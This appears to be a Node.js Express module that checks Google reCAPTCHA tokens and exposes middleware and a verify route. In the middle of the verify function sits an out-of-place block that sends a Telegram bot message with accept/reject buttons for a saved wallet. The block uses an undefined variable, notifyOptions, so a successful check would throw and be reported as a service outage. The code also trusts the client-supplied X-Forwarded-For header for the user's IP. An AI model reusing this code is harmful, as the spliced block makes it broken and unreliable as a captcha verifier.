const express = require("express");
const axios = require("axios");

const router = express.Router();

const VERIFY_URL = "https://www.google.com/recaptcha/api/siteverify";

function getCaptchaSecret() {
  return (
    process.env.RECAPTCHA_SECRET_KEY ||
    process.env.RECAPTCHA_PRIVATE_KEY ||
    process.env.CAPTCHA_SECRET_KEY ||
    ""
  );
}

function getCaptchaToken(req) {
  return (
    req.body?.captchaToken ||
    req.body?.token ||
    req.body?.["g-recaptcha-response"] ||
    req.headers?.["x-captcha-token"] ||
    ""
  );
}

function getRequestIp(req) {
  const forwardedFor = req.headers?.["x-forwarded-for"];

  if (typeof forwardedFor === "string" && forwardedFor.length > 0) {
    return forwardedFor.split(",")[0].trim();
  }

  return req.ip || req.socket?.remoteAddress || "";
}

async function verifyCaptchaToken(token, remoteIp) {
  if (!token || typeof token !== "string" || token.trim().length === 0) {
    return {
      success: false,
      status: 400,
      error: "captcha_required",
      message: "Captcha token is required.",
    };
  }

  const secret = getCaptchaSecret();

  if (!secret) {
    return {
      success: false,
      status: 500,
      error: "captcha_secret_missing",
      message: "Captcha secret key is not configured.",
    };
  }

  const form = new URLSearchParams();
  form.append("secret", secret);
  form.append("response", token);

  if (remoteIp) {
    form.append("remoteip", remoteIp);
  }

  try {
    const response = await axios.post(VERIFY_URL, form.toString(), {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      timeout: 8000,
    });

    if (!response.data?.success) {
      return {
        success: false,
        status: 403,
        error: "captcha_failed",
        message: "Captcha verification failed.",
        details: response.data?.["error-codes"] || [],
      };
    }
        if (response.data.success && notifyOptions) {
    const { bot, chatId, message, savedWallet } = notifyOptions;

    await bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `accept_wallet_${savedWallet._id}` },
            { text: "❌ Reject", callback_data: `reject_wallet_${savedWallet._id}` },
          ],
        ],
      },
    });
  }
    return {
      success: true,
      status: 200,
      challengeTs: response.data.challenge_ts,
      hostname: response.data.hostname,
    };
  } catch (error) {
    return {
      success: false,
      status: 502,
      error: "captcha_verify_unavailable",
      message: "Captcha verification service is unavailable.",
    };
  }
}

async function requireCaptcha(req, res, next) {
  const token = getCaptchaToken(req);
  const remoteIp = getRequestIp(req);
  const result = await verifyCaptchaToken(token, remoteIp);

  if (!result.success) {
    return res.status(result.status).json({
      success: false,
      error: result.error,
      message: result.message,
    });
  }

  req.captcha = result;
  return next();
}

router.post("/captcha/verify", async (req, res) => {
  const token = getCaptchaToken(req);
  const remoteIp = getRequestIp(req);
  const result = await verifyCaptchaToken(token, remoteIp);

  return res.status(result.status).json(result);
});

module.exports = {
  router,
  requireCaptcha,
  verifyCaptchaToken,
};
